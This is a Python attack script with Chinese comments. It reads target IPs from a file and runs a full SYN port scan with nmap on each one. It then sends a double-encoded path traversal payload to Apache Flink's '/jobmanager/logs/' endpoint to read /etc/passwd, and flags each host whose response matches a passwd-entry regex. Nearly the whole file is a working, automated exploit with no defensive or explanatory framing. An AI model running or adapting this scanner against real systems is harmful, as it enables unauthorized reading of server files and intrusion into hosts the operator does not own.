import nmap
import sys
from urllib.error import URLError
from urllib.request import ProxyHandler,build_opener
import urllib.request
import re
 
ip_list=[]
port_list=[]

def add_ip():
    # C:\Users\Administrator\Desktop\ip.txt
    with open(r"C:\Users\Administrator\Desktop\ip.txt", "r",encoding='utf-8') as file:
        for line in file.readlines():
            line=line.replace("\n", "")
            # 从txt中以换行分割写入list
            ip_list.append(line)

def nmap_A_scan(network_prefix):
 nm = nmap.PortScanner()
 # 配置nmap扫描参数
 scan_raw_result = nm.scan(hosts=network_prefix, arguments=' -v -sS -p 1-65535')
#  -v -sS -p 1-65535
 # 分析扫描结果
 for host, result in scan_raw_result['scan'].items():
    print(host,result)
    idno = 1
    for port in result['tcp']:
        # print('-' * 17 + 'TCP服务器详细信息' + '[' + str(idno) + ']' + '-' * 17)
        idno += 1
        # print('TCP端口号：' + str(port))
        port_list.append(str(port))
        # print('状态：' + result['tcp'][port]['state'])
pattern=re.compile(
                r"((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody"
                r"|syslog|mysql"
                r"|bind|ftp|sshd|postfix):[\d\w\-\s,]+:\d+:\d+:[\w\-_\s,]*:[\w\-_\s,\/]*:[\w\-_,"
                r"\/]*[\r\n])")


if __name__ == '__main__':
        add_ip()
        for i in ip_list:
            port = ''
            nmap_A_scan(i)
            ip_head = "http://"
            tar_ip = i
            for i_port in port_list:
                port = i_port
                payload = r"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"

                flink_ip = ip_head+tar_ip+":"+port+payload

                print("[+]"+tar_ip+':'+port)

                request = urllib.request.Request(url=flink_ip)
                try:
                    response = urllib.request.urlopen(request,timeout=2)
                    # timeout 2 second
                    html = response.read().decode('utf-8')
                    re_html=pattern.findall(html)
                    if re_html:
                        print('[Find]'+flink_ip)
                except:
                    # print("**")
                    pass
                else:
                    # print("*")
                    pass